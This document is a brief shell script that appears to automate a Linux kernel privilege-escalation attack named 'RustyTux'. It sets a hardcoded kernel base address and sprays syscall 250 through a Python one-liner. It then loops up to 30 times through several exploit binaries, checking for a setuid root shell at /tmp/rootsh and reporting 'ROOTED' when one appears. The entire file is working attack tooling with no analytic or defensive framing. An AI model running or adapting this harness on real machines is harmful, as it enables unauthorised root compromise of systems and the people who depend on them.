#!/bin/sh
cd /tmp/rt || exit 1
KB=0xffffffffb9800000
echo "=== RustyTux at stable band $KB (30 attempts, 5 variants) ==="
for i in $(seq 1 30); do
  python3 -c "import ctypes;l=ctypes.CDLL(None);[l.syscall(250,7,ctypes.c_ulong(r)) for r in range(-1,-10,-1)]" 2>/dev/null
  for exe in e_def e_exploit e_exploit-fixdef e_exploit-wide2 e_exploit-ms; do
    [ -x "$exe" ] || continue
    BBH_KBASE=$KB timeout 60 ./$exe --aggressive --quiet >/dev/null 2>&1
    if [ -u /tmp/rootsh ]; then echo "ROOTED at $KB via $exe attempt $i"; ls -la /tmp/rootsh; exit 0; fi
  done
  [ $((i % 5)) -eq 0 ] && echo "attempt $i done"
done
echo "DONE_NO_ROOT"
